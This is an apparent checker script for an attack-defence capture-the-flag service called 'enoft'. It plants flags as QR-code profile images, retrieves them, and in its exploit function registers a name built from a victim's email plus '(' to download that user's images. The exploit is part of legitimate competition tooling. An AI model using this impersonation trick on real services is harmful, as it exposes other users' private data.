from logging import LoggerAdapter
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    ExploitCheckerTaskMessage,
)
import secrets
from typing import Optional
from utils import InteractionManager
import qr_codes

SERVICE_PORT = 8008
# from httpx import AsyncClient


checker = Enochecker("enoft", 8008)
def app(): return checker.app


@checker.putflag(0)
async def putflag_email(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    flag = task.flag
    qrCode = qr_codes.create_qr_code(flag)
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)

    await m.register(vendor_lock=True)
    await m.upload_image(qrCode)
    data = m.dump_info()
    await db.set("credentials", data)
    data = m.dump_info()
    for key in data:
        await db.set(key, data[key])

    return data["email"]


@checker.getflag(0)
async def getflag_email(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    logger.info("Getting flag")
    try:
        credentials = await db.get("credentials")
    except:
        raise MumbleException("No credentials saved in db")
    logger.info(f"Got credentials: {credentials}")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, email_name_key=credentials)
    await m.login()
    imgs = await m.download_profile_images_from_self()
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Downloaded {len(imgs)} images")
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    logger.info(f"Decoded images: {imgs}")
    assert_in(task.flag, imgs, "Flag not found in images")


@checker.exploit(0)
async def exploit_email(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter
) -> Optional[str]:
    logger.info(f"Exploiting {task.attack_info} ")
    email = task.attack_info
    name = email + "("
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, forced_name=name)
    await m.register()
    imgs = await m.download_profile_images_from_email(email)
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Downloaded {len(imgs)} images")
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    logger.info(f"Decoded images: {imgs}")
    return imgs[0]


if __name__ == "__main__":
    checker.run()
